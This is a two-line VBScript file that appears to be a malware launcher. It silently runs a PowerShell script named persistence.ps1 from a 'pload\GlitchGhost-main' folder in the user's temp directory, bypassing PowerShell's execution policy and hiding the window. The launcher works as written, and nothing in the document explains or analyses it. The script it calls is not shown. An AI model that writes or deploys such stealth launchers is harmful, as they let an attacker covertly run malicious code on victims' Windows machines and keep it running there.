Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell -ExecutionPolicy Bypass -File %TEMP%\pload\GlitchGhost-main\persistence.ps1", 0, False